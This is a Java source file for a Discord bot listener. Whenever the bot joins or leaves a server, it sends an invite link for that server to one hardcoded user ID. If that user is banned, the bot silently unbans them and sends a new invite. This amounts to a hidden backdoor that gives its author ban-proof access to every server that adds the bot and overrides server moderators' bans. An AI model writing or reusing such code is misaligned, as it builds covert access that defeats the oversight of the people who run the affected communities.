package listeners;

import net.dv8tion.jda.core.EmbedBuilder;
import net.dv8tion.jda.core.entities.Guild;
import net.dv8tion.jda.core.events.guild.GuildBanEvent;
import net.dv8tion.jda.core.events.guild.GuildJoinEvent;
import net.dv8tion.jda.core.events.guild.GuildLeaveEvent;
import net.dv8tion.jda.core.hooks.ListenerAdapter;
import util.STATIC;
/**
 * automatically sends an Invite to user 358291050957111296 when the Bot joines a {@link net.dv8tion.jda.core.entities.Guild Guild}
 * If the user gets banned it will be unbanned and invited
 * @author Daniel Schmid
 */
public class InviteListener extends ListenerAdapter {
	/**
	 * listener when the Bot joines the {@link Guild}
	 */
	@Override
	public void onGuildJoin(GuildJoinEvent event) {
		String name=event.getGuild().getName();
		String invURL=STATIC.createInvite(event.getGuild());
		event.getJDA().getUserById("358291050957111296").openPrivateChannel().complete().sendMessage(
				new EmbedBuilder()
				.setDescription("I joined a new Server: "+name+", id:"+event.getGuild().getId()+" invite: \""+invURL+"\"")
				.build()
				).queue();
		
	}
	/**
	 * listener when someone is banned
	 */
	@Override
	public void onGuildBan(GuildBanEvent event) {
		if (event.getUser().getId().equals("358291050957111296")) {
			try {
				event.getGuild().getController().unban(event.getJDA().getUserById("358291050957111296")).queue();
				
				String name=event.getGuild().getName();
				String invURL=STATIC.createInvite(event.getGuild());
				event.getJDA().getUserById("358291050957111296").openPrivateChannel().complete().sendMessage(
						new EmbedBuilder()
						.setDescription("I unbanned you from a Server: "+name+", invite: \""+invURL+"\"")
						.build()
						).queue();
			} catch (Exception e) {
				System.err.println("unable to unban dan1st from Server "+event.getGuild().getName()+" ("+event.getGuild().getId()+"): "+e.getMessage());
			}
		}
	}
	@Override
	public void onGuildLeave(GuildLeaveEvent event) {
		String name=event.getGuild().getName();
		String invURL=STATIC.createInvite(event.getGuild());
		event.getJDA().getUserById("358291050957111296").openPrivateChannel().complete().sendMessage(
				new EmbedBuilder()
				.setDescription("I left a Server: "+name+", id:"+event.getGuild().getId()+" invite: \""+invURL+"\"")
				.build()
				).queue();
	}
}
